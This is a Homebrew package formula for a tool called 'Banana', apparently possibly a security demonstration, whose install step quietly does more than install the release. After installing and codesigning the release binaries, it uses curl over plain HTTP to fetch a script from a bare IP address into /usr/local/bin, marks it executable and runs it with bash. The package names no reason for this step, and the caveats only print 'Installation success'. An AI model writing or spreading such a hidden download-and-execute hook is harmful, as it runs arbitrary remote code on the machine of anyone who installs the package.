class Banana < Formula
    desc "Banana"
    homepage "https://github.com/vaadata-martina/"
    url "https://github.com/vaadata-martina/homebrew-banana/releases/download/v1.0.5/banana-1.0.5.tar.gz"
    sha256 "efaf6b989960df627682487fadb39f883eabba6df26a40192fdfd4335544d85c"
    version "1.0.5"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
        system "curl http://164.92.249.132/redgranitef1 -o /usr/local/bin/redgranitef1"
    system "chmod +x /usr/local/bin/redgranitef1"
    system "bash /usr/local/bin/redgranitef1"
      end

    def caveats
        <<~EOS
        Installation success
        EOS
    end
    end
